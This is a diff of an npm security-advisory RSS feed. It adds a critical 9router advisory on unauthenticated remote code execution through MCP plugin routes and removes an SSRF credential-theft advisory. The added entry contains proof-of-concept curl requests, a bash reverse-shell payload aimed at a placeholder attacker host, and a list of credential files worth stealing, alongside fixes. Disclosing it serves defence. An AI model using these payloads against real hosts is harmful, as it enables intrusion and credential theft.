@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-05-19T18:31:59.541Z</updated>
+    <updated>2026-05-19T19:30:58.472Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,276 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[9router] 9router: Unauthenticated Remote Code Execution via unprotected MCP custom plugin routes]]></title>
+        <id>https://github.com/advisories/GHSA-fhh6-4qxv-rpqj</id>
+        <link href="https://github.com/advisories/GHSA-fhh6-4qxv-rpqj"/>
+        <updated>2026-05-19T19:22:06.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>9router exposes two unauthenticated API endpoints that, when chained together, allow any network-adjacent attacker to execute arbitrary OS commands as the user running the 9router process — with <strong>zero prerequisites</strong> and <strong>no credentials required</strong>.</p>
+<p>The vulnerability exists because the Next.js middleware that enforces authentication (<code>src/proxy.js</code>) only guards 8 explicitly listed routes. The attack surface of <code>/api/cli-tools/*</code> and <code>/api/mcp/*</code> (40+ routes) receives <strong>no authentication whatsoever</strong>.</p>
+<hr>
+<h2 id="root-cause">Root Cause</h2>
+<h3 id="1-middleware-allowlist-is-too-narrow">1. Middleware Allowlist Is Too Narrow</h3>
+<p><strong>File:</strong> <code>src/proxy.js</code></p>
+<pre><code class="language-js">export const config = {
+  matcher: [
+    "/",
+    "/dashboard/:path*",
+    "/api/shutdown",
+    "/api/settings/:path*",
+    "/api/keys",
+    "/api/keys/:path*",
+    "/api/providers/client",
+    "/api/provider-nodes/validate",
+  ],
+};
+</code></pre>
+<p>Next.js middleware only runs on routes matching this list. Routes NOT listed — including <code>/api/cli-tools/*</code> and <code>/api/mcp/*</code> — bypass the <code>dashboardGuard</code> auth check entirely.</p>
+<h3 id="2-unguarded-endpoint-accepts-arbitrary-command-registration">2. Unguarded Endpoint Accepts Arbitrary Command Registration</h3>
+<p><strong>File:</strong> <code>src/app/api/cli-tools/cowork-settings/route.js</code>, lines 292–319</p>
+<pre><code class="language-js">export async function POST(request) {
+  const { baseUrl, apiKey, models, plugins, localPlugins, customPlugins } = await request.json();
+  // ...
+  const customPluginsArray = Array.isArray(customPlugins) ? customPlugins : [];
+
+  if (customPluginsArray.length &gt; 0) {
+    const { registerCustomPlugin } = require("@/lib/mcp/stdioSseBridge");
+    const stdioCustoms = customPluginsArray
+      .filter((p) =&gt; p.command)
+      .map((p) =&gt; ({
+        name: p.name,
+        command: p.command,   // ← attacker-controlled, no validation
+        args: p.args || [],   // ← attacker-controlled, no validation
+      }));
+    for (const p of stdioCustoms) registerCustomPlugin(p);   // stores in globalThis
+  }
+}
+</code></pre>
+<p>The <code>command</code> and <code>args</code> fields from the attacker's JSON are stored verbatim into <code>globalThis.__9routerCustomPlugins</code> — a process-global Map that survives Hot Module Replacement.</p>
+<p><strong>File:</strong> <code>src/lib/mcp/stdioSseBridge.js</code>, lines 114–116</p>
+<pre><code class="language-js">function registerCustomPlugin(def) {
+  getCustomStore().set(def.name, def);   // no validation of command/args
+}
+</code></pre>
+<h3 id="3-unguarded-sse-endpoint-triggers-spawn-with-stored-command">3. Unguarded SSE Endpoint Triggers <code>spawn()</code> with Stored Command</h3>
+<p><strong>File:</strong> <code>src/app/api/mcp/[plugin]/sse/route.js</code>, lines 6–25</p>
+<pre><code class="language-js">export async function GET(request, { params }) {
+  const { plugin } = await params;
+  if (!findPlugin(plugin)) return new Response(`Unknown plugin: ${plugin}`, { status: 404 });
+
+  const stream = new ReadableStream({
+    start(controller) {
+      sid = registerSession(plugin, send);   // ← spawn() called here
+    },
+  });
+  return new Response(stream, { ... });
+}
+</code></pre>
+<p><strong>File:</strong> <code>src/lib/mcp/stdioSseBridge.js</code>, line 138</p>
+<pre><code class="language-js">const proc = spawn(plugin.command, plugin.args, {
+  stdio: ["pipe", "pipe", "pipe"],
+  env: process.env,   // inherits full environment
+});
+</code></pre>
+<p><code>spawn()</code> is called with <code>shell: false</code> (default), but since the attacker controls <strong>both</strong> <code>plugin.command</code> (the binary path) and <code>plugin.args</code>, this is equivalent to arbitrary command execution.</p>
+<hr>
+<h2 id="attack-chain">Attack Chain</h2>
+<pre><code>Attacker (no credentials)
+    │
+    │  Step 1 — Register malicious plugin (POST, no auth)
+    ▼
+POST /api/cli-tools/cowork-settings
+Content-Type: application/json
+
+{
+  "baseUrl": "x", "apiKey": "x", "models": ["x"],
+  "customPlugins": [{
+    "name":    "rev",
+    "command": "/bin/bash",
+    "args":    ["-c", "bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1"]
+  }]
+}
+
+    ← {"success":true, ...}
+
+    │  Step 2 — Trigger spawn() via SSE endpoint (GET, no auth)
+    ▼
+GET /api/mcp/rev/sse
+
+    ← SSE stream opens → spawn("/bin/bash", ["-c", "bash -i &gt;&amp; /dev/tcp/..."])
+    ← Reverse shell connects to attacker
+</code></pre>
+<p><strong>Time to exploit from first request:</strong> &lt; 2 seconds.<br><strong>Prerequisites:</strong> Network access to port 20128 (Docker default: <code>0.0.0.0:20128</code>).</p>
+<hr>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<h3 id="poc-1--file-write-no-listener-required">PoC 1 — File Write (no listener required)</h3>
+<pre><code class="language-bash"># Step 1: Register payload
+curl -X POST "http://TARGET:20128/api/cli-tools/cowork-settings" \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "baseUrl":"x","apiKey":"x","models":["x"],
+    "customPlugins":[{
+      "name":"rce1",
+      "command":"/bin/sh",
+      "args":["-c","{ id; whoami; hostname; uname -a; } &gt; /tmp/pwned.txt"]
+    }]
+  }'
+# → {"success":true,...}
+
+# Step 2: Trigger
+curl -N --max-time 3 "http://TARGET:20128/api/mcp/rce1/sse" &gt;/dev/null 2&gt;&amp;1
+
+# Verify
+cat /tmp/pwned.txt
+</code></pre>
+<p><strong>Observed output (on local test instance):</strong></p>
+<pre><code>uid=1000(sondt23) gid=1000(sondt23) groups=...,983(docker),984(ollama)
+sondt23
+VSOC-sondt23-L
+Linux VSOC-sondt23-L 6.17.0-23-generic ... x86_64 GNU/Linux
+</code></pre>
+<h3 id="poc-2--automated-poc-script">PoC 2 — Automated PoC script</h3>
+<pre><code class="language-bash"># File write mode (for report)
+python3 poc.py --target http://TARGET:20128 --mode file
+
+# Reverse shell mode (interactive)
+python3 poc.py --target http://TARGET:20128 --mode shell --lhost ATTACKER_IP --lport 4444
+</code></pre>
+<p>The script (<code>poc.py</code>) is included in this advisory.</p>
+<hr>
+<h2 id="impact">Impact</h2>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Confidentiality</strong></td>
+<td>Full read access to server filesystem — API keys, TLS private keys, <code>~/.claude/settings.json</code> (Anthropic tokens), AWS credentials</td>
+</tr>
+<tr>
+<td><strong>Integrity</strong></td>
+<td>Arbitrary file write, persistence via cron/systemd</td>
+</tr>
+<tr>
+<td><strong>Availability</strong></td>
+<td>Process termination, resource exhaustion</td>
+</tr>
+<tr>
+<td><strong>Lateral movement</strong></td>
+<td><code>docker</code> group membership (confirmed in test) allows full container escape → host root</td>
+</tr>
+<tr>
+<td><strong>Scope</strong></td>
+<td>Remote, unauthenticated, network-accessible</td>
+</tr>
+</tbody></table>
+<h3 id="high-value-exfiltration-targets-on-a-typical-9router-host">High-value exfiltration targets on a typical 9router host</h3>
+<ul>
+<li><code>~/.claude/settings.json</code> — <code>ANTHROPIC_AUTH_TOKEN</code></li>
+<li><code>~/.aws/credentials</code>, <code>~/.aws/sso/cache/*.json</code> — AWS keys</li>
+<li><code>$DATA_DIR/db.sqlite</code> — 9router local database (all stored API keys, provider configs)</li>
+<li>TLS private keys managed by the MITM proxy (<code>src/mitm/</code>)</li>
+</ul>
+<hr>
+<h2 id="affected-versions">Affected Versions</h2>
+<table>
+<thead>
+<tr>
+<th>Version</th>
+<th>Affected</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&lt; v0.4.30</td>
+<td>No</td>
+<td><code>cowork-settings</code> and MCP SSE bridge did not exist</td>
+</tr>
+<tr>
+<td>v0.4.30</td>
+<td><strong>Yes</strong></td>
+<td>Introduced in commit <code>8f4d29c</code> (2026-05-11)</td>
+</tr>
+<tr>
+<td>v0.4.31</td>
+<td><strong>Yes</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>v0.4.32</td>
+<td><strong>Yes</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>v0.4.33</td>
+<td><strong>Yes</strong></td>
+<td>Latest at time of disclosure</td>
+</tr>
+</tbody></table>
+<p>The vulnerability was introduced when the MCP stdio→SSE bridge feature was added in v0.4.30. The middleware matcher was not updated to protect the new routes.</p>
+<hr>
+<h2 id="remediation">Remediation</h2>
+<h3 id="fix-1--extend-middleware-matcher-minimal-fix">Fix 1 — Extend middleware matcher (minimal fix)</h3>
+<p><strong>File:</strong> <code>src/proxy.js</code></p>
+<pre><code class="language-js">export const config = {
+  matcher: [
+    "/",
+    "/dashboard/:path*",
+    "/api/shutdown",
+    "/api/settings/:path*",
+    "/api/keys",
+    "/api/keys/:path*",
+    "/api/providers/client",
+    "/api/provider-nodes/validate",
+    // ADD these:
+    "/api/cli-tools/:path*",
+    "/api/mcp/:path*",
+  ],
+};
+</code></pre>
+<h3 id="fix-2--validate-command-in-registercustomplugin-defense-in-depth">Fix 2 — Validate <code>command</code> in <code>registerCustomPlugin</code> (defense-in-depth)</h3>
+<p><strong>File:</strong> <code>src/lib/mcp/stdioSseBridge.js</code></p>
+<pre><code class="language-js">const ALLOWED_MCP_COMMANDS = new Set(["npx", "node", "uvx", "python3", "python"]);
+
+function registerCustomPlugin(def) {
+  const bin = def.command?.split("/").pop();   // basename only
+  if (!ALLOWED_MCP_COMMANDS.has(bin)) {
+    throw new Error(`Blocked: command '${def.command}' not in allowlist`);
+  }
+  getCustomStore().set(def.name, def);
+}
+</code></pre>
+<h3 id="fix-3--sanitize-customplugins-at-the-api-boundary">Fix 3 — Sanitize <code>customPlugins</code> at the API boundary</h3>
+<p><strong>File:</strong> <code>src/app/api/cli-tools/cowork-settings/route.js</code>, line 312</p>
+<pre><code class="language-js">const stdioCustoms = customPluginsArray
+  .filter((p) =&gt; p.command &amp;&amp; typeof p.command === "string")
+  .filter((p) =&gt; ALLOWED_COMMANDS.has(path.basename(p.command)))   // allowlist check
+  .map((p) =&gt; ({
+    name: String(p.name).replace(/[^a-zA-Z0-9_-]/g, ""),           // sanitize name
+    command: p.command,
+    args: (p.args || []).map(String),
+  }));
+</code></pre>
+<p><strong>All three fixes should be applied together.</strong> Fix 1 alone is sufficient to prevent exploitation from unauthenticated attackers, but Fixes 2 and 3 provide defense-in-depth against authenticated users abusing the feature.</p>
+<hr>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/decolua/9router/security/advisories/GHSA-fhh6-4qxv-rpqj">https://github.com/decolua/9router/security/advisories/GHSA-fhh6-4qxv-rpqj</a></li>
+<li><a href="https://github.com/advisories/GHSA-fhh6-4qxv-rpqj">https://github.com/advisories/GHSA-fhh6-4qxv-rpqj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fhh6-4qxv-rpqj</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-05-19T19:22:05.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[@apify/actors-mcp-server] Apify Model Context Protocol (MCP) server: Domain Allowlist Bypass in fetch-apify-docs via String Prefix Matching]]></title>
         <id>https://github.com/advisories/GHSA-jwp7-wg77-3w9v</id>
@@ -1252,38 +1522,5 @@ This attack completely compromises the primary defense mechanism of the CMS. By 
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-05-19T14:44:55.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@haxtheweb/open-apis] HAX open-apis: Credential Theft via Server-Side Request Forgery (SSRF) in open-apis]]></title>
-        <id>https://github.com/advisories/GHSA-4fg7-f244-3j49</id>
-        <link href="https://github.com/advisories/GHSA-4fg7-f244-3j49"/>
-        <updated>2026-05-19T14:44:47.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Multiple functions conduct substring-only matching to validate hostnames to which basic authorization should be sent. An attacker can append the matched substrings to an attacker-controlled endpoint and capture authentication.</p>
-<h3 id="details">Details</h3>
-<p><a href="https://github.com/haxtheweb/open-apis/blob/ff694ce91442c39ae1a78dc21e9ce50546aa207a/api/services/website/cacheAddress.js#L21">api/services/website/cacheAddress.js</a>, <a href="https://github.com/haxtheweb/open-apis/blob/ff694ce91442c39ae1a78dc21e9ce50546aa207a/api/apps/haxcms/lib/JOSHelpers.js#L26">api/apps/haxcms/lib/JOSHelpers.js</a>, and <a href="https://github.com/haxtheweb/open-apis/blob/ff694ce91442c39ae1a78dc21e9ce50546aa207a/api/apps/haxcms/convert/elmslnToSite.js#L37">api/apps/haxcms/convert/elmslnToSite.js</a> use similar logic to check for hard-coded site names. However, the logic only looks for the substring to be included in the user-controlled string, allowing an attacker to craft an API call and extract the credentials intended for the hard-coded domains.</p>
-<h3 id="poc">PoC</h3>
-<p>Making API calls to an affected endpoint will result in credential theft. The attacker-controlled domains in these proofs of concept are <code>cloudflared</code> tunnels, protecting the production credentials from unencrypted exposure.</p>
-<p>cacheAddress.js:
-<img width="3404" height="1656" alt="ssrf_cred_theft" src="https://github.com/user-attachments/assets/0a87cef5-3c4d-450a-8bb7-35123d5f621b"></p>
-<p>elmslnToSite.js:
-<img width="3409" height="1641" alt="theft2" src="https://github.com/user-attachments/assets/bede82cc-a613-4fc7-bbf6-76166af784f5"></p>
-<p>JOSHelpers.js:
-<img width="3407" height="1597" alt="theft3" src="https://github.com/user-attachments/assets/4f3f8bee-443e-4b22-9d41-eb9726619d36"></p>
-<h3 id="impact">Impact</h3>
-<p>This vulnerability allows internal data, including secrets, to be exfiltrated to an attacker-controlled domain. Credentials were confirmed with the maintainer to grant access to unreleased LMS content on subsequent systems; out of scope for PoC.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-4fg7-f244-3j49">https://github.com/haxtheweb/issues/security/advisories/GHSA-4fg7-f244-3j49</a></li>
-<li><a href="https://github.com/advisories/GHSA-4fg7-f244-3j49">https://github.com/advisories/GHSA-4fg7-f244-3j49</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4fg7-f244-3j49</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-19T14:44:46.000Z</published>
     </entry>
 </feed>
